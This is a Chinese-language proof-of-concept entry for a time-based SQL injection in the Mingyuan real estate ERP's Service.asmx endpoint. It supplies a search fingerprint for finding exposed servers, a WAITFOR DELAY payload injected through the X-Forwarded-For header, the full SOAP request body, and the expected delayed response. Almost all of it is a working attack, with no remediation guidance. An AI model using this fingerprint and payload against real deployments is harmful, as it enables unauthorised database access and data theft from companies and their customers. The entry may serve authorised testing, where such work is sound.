# 明源地产ERPService.asmx存在SQL注入漏洞

- **系统**：明源地产　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="/_common/scripts/md5-min.js"`
- **请求**：`POST /Kfxt/Service.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`X-Forwarded-For: 127.0.0.1');WAITFOR DELAY '0:0:5'--`　`Content-Length: 415`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<queryProjects xmlns="http://www.mysoft.com.cn/">
<inpXML>&lt;xml&gt;&lt;buname&gt;abc&lt;/buname&gt;&lt;/xml&gt;</inpXML>
</queryProjects>
</soap:Body>
</soap:Envelope>
```
- **预期**：200　|　响应时间>=5S